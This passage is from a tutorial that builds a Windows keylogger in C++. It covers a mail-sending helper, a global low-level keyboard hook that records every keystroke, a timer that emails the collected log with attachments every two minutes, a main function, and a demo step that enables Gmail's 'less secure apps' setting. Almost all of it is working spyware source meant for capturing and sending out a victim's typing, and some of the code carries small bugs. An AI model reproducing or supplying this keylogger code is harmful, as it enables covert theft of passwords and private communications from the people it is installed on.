        ShExecInfo.nShow=SW_HIDE;
        ShExecInfo.hInstApp=NULL;

        ok = (bool)ShellExecuteEx(&ShExecInfo);
        if(!ok) return -3;
        WaitForSingleObject(ShExecInfo.hProcess, 7000); //7 SECONDS
        DWORD exit_code = 100;//ARBITRARY NUMBER
        GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);

	//THE FOLLOWING IS A LAMBDA FUNCTION
        m_timer.SetFunction([&]()
        {
            WaitForSingleObject(ShExecInfo.hProcess, 60000);
            GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
            if((int)exit_code == STILL_ACTIVE) TerminateProcess(ShExecInfo.hProcess, 100);
            Helper::WriteAppLog("<From SendMail> Return code: "+Helper::ToString((int)exit_code));
        });
        
        m_timer.RepeatCount(1L);
        m_timer.SetInterval(10L);
        m_timer.Start(true);
        return (int)exit_code;
    }
    
    //THE FOLLOWING FUNCTION IS ABLE TO PASS MULTIPLE ATTACHMENTS
    //NOT LIMITEED TO ONLY ONE ATTACHMENT
    int SendMail(const std::string &subject, const std::string &body, const std::vector<std::string>&att)
    {
        std::string attachments="";
        if(att.size()==1U) attachments = att.at(0);
        else 
        {
            for(const auto &v : att) attachments += v + "::";
	    attachments=attachments.substr(0, attachments.length()-2);	
        }
        return SendMail(subject, body, attachments);
    }
	}

    #endif // SEND_MAIL_H

THAT'S ALL.

KeyBoardHook: THIS HEADER WILL BE THE ONE THAT IS IN CHARGE OF RECORDING ALL THE KEY STROKES. THIS IS PROBABLY THE
MOST IMPORTANT HEADER. WE WILL USE A SERIES OF WINDOWS API FUNCTIONS TO HOOK KEYBOARD EVENTS.
LET'S START CODING:

	#ifndef KEYBHOOK_H
	#define KEYBHOOK_H

	#include <iostream>
	#include <fstream>
	#include <windows.h>

	#include "KeyConstants.h"
	#include "Timer.h"
	#include "SendMail.h"

	//THE FOLLOWING WOULD BE A VARIABLE WHERE ALL THE KEYY STROKES
	//ARE STORED, AFTER THE MAIL IS SEND, THE VARUABLE WILL BE CLEARED
	//BUT, IF THE SENDING OF THE MAIL DOESN'T SUCCEED,
	//THE CONTENT OF THE VARIABLE WON'T BE CLEARED
	std::string keylog="";

	//WE'RE GOING TO SEND EMAILS EACH 2 MINUTES
	void TimerSendMail()
	{
    	if(keylog.empty()) return;
    	std::string last_file=IO::WriteLog(keylog);

    if(last_file.empty())
    {
        Helper::WriteAppLog("File creation wasn't succesfull, Keylog '" + keylog + "'");
        return;
    }

    int x = Mail::SendMail("Log ["+last_file+"]",
                           "Hi, \nThe file has been attached to this mail, for testing"+keylog,
                           IO::GetOurPath(true)+last_file);
    if(x!=7) Helper::WriteAppLog("MAIL WAS'N SENT! ERROR CODE: " + Helper::ToString(x));
    else keylog = "";

	}

	Timer MailTimer(TimerSendMail, 2000*60, Timer::Infinite);

	HHOOK eHook = NULL;

	LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
	{
    //IF WE RECEIVE nCode LESS THAN ZERO, THAT MEANS THAT WE MUST PROPAGATE THE HOOKS
    if(nCode<0) CallNextHookEx(eHook, nCode, wparam, lparam);
    //READ ABOUT THE FOLLOWING: KBDLLHOOKSTRUCT
    //SEARCH IN "docs.microsoft.com/en-us/windows"
    //CONTAINS A LOT OF DATA FOR US
    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;
    if(wparam==WM_KEYDOWN || wparam==WM_SYSKEYDOWN)
    {
        //USING OUR MAP FROM KeyConstants
        keylog+=Keys::KEYS[kbs->vkCode].Name;
        if(kbs->vkCode = VK_RETURN) keylog+='\n';
    }

    else if(wparam==WM_KEYUP || wparam == WM_SYSKEYUP)
    {
        //THE FOLLOWING IS THE "STYLE" THAT THE KEYLOGGER SHOWS FOR EACH KEY
        //[SHIFT][a][b][c][/SHIFT]
        DWORD key = kbs->vkCode;
        if(key==VK_CONTROL || key==VK_LCONTROL || key ==VK_RCONTROL
           || key==VK_SHIFT || key==VK_RSHIFT || key==VK_LSHIFT
           || key==VK_MENU || key==VK_LMENU || key==VK_RMENU || key==VK_CAPITAL
           || key==VK_NUMLOCK || key==VK_LWIN || key==VK_RWIN)
        {
            std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
            KeyName.insert(1, "/");
            keylog+=KeyName;
        }
    }
    return CallNextHookEx(eHook, nCode, wparam, lparam);
	}

	//"WH_KEYBOARD" INDICATES THAT WE USE KEYBOARD HOOK
	//AND "_LL" (SHORTHAND FOR LOW LEVEL) INDICATES THAT THIS IS A GLOBAL HOOK
	//THE VALUE OF THE CONSTANT IS 13
	bool InstallHook()
	{
    Helper::WriteAppLog("Hook Started... Timer started");
    MailTimer.Start(true);
    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(NULL), 0);
    return eHook==NULL;
	}

	bool UninstallHook()
	{
    BOOL b = UnhookWindowsHookEx(eHook);
    eHook = NULL;
    return (bool)b;
	}

	bool IsHooked()
	{
    	return (bool)(eHook==NULL);
	}

	#endif // KEYBHOOK_H

FINALLY, THE "main" FUNCTION IS:

	#include <iostream>
	#include <windows.h>
	#include "Helper.h"
	#include "KeyConstants.h"
	#include "Base64.h"
	#include "Timer.h"
	#include "SendMail.h"
	#include "KeybHook.h"

	using namespace std;

	int main()
	{
    MSG Msg;

    IO::MKDir(IO::GetOurPath(true));

    InstallHook();

    while(GetMessage(&Msg, NULL, 0, 0))
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }

    MailTimer.Stop();

    return 0;
	}

DEMO: WE'RE GOING TO USE GMAIL, SEARCH IN GOOGLE (WHEN YOU'RE LOGIN) "google less secure apps", OPEN UP THE FIRST 
LINK THAT COMES. SCROLL DOWN AND CLICK ON "less secure apps section" AND CLICK ON "TURN ON". THAT'S IT.
GO TO THE FOLDER WHERE YOU SAVED THE PROJECT (OF THE KEYLOGGER, OBVIOUSLY) AND GO TO ".../bin/Debug", AND CLICK
ON "Keylogger". 
NOW, START TO KEY, WAIT 2 MINUTES (OR YOU CAN EDIT THE CODE TO WAIT LESS), AND YOU WILL RECEIVE AN EMAIL WITH A
BODY AND A FILE ATTACH. THAT'S ALL.
